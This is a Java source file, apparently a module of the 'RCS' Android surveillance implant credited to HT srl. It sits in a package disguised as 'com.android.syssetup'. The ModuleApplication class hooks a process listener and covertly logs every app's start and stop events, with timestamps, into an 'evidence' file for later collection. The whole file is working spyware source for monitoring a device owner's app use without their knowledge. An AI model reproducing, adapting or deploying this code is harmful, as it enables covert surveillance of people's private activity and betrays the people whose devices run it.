/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentApplication.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.module;

import java.util.ArrayList;

import com.android.syssetup.ProcessInfo;
import com.android.syssetup.ProcessStatus;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfModule;
import com.android.syssetup.evidence.EvidenceBuilder;
import com.android.syssetup.evidence.EvidenceType;
import com.android.syssetup.interfaces.IncrementalLog;
import com.android.syssetup.interfaces.Observer;
import com.android.syssetup.listener.ListenerProcess;
import com.android.syssetup.util.ByteArray;
import com.android.syssetup.util.Check;
import com.android.syssetup.util.DateTime;
import com.android.syssetup.util.WChar;


public class ModuleApplication extends BaseModule implements IncrementalLog, Observer<ProcessInfo> {
	private static final String TAG = "ModuleApplication"; //$NON-NLS-1$

	@Override
	public boolean parse(ConfModule conf) {
		return true;
	}

	@Override
	public void actualGo() {

	}

	EvidenceBuilder evidenceIncremental;

	@Override
	public void actualStart() {
		// viene creato un file temporaneo di log application, aperto.
		evidenceIncremental = new EvidenceBuilder(EvidenceType.APPLICATION);
		ListenerProcess.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerProcess.self().detach(this);
		// il log viene chiuso.
		evidenceIncremental.close();
	}

	public int notification(ProcessInfo process) {
		saveEvidence(process.processInfo, process.status);
		return 0;
	}

	/**
	 * Viene invocata dalla notification, a sua volta invocata dal listener
	 * 
	 * @param processInfo
	 * @param status
	 */
	private void saveEvidence(String processInfo, ProcessStatus status) {
		if (Cfg.DEBUG) {
			Check.requires(processInfo != null, "null process"); //$NON-NLS-1$
		}

		final String name = processInfo;
		final String module = processInfo;

		final byte[] tm = (new DateTime()).getStructTm();

		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		items.add(tm);
		items.add(WChar.getBytes(name, true));
		items.add(WChar.getBytes(status.name(), true));
		items.add(WChar.getBytes(module, true));
		items.add(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));

		if (Cfg.DEBUG) {
			Check.asserts(evidenceIncremental != null, "null log"); //$NON-NLS-1$
		}

		synchronized (this) {
			evidenceIncremental.write(items);
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveEvidence): " + name + " " + status.name());//$NON-NLS-1$ //$NON-NLS-2$
		}
	}

	public synchronized void resetLog() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (resetLog)");
		}
		if (evidenceIncremental.hasData()) {
			evidenceIncremental.close();
			evidenceIncremental = new EvidenceBuilder(EvidenceType.APPLICATION);
		}
	}

}
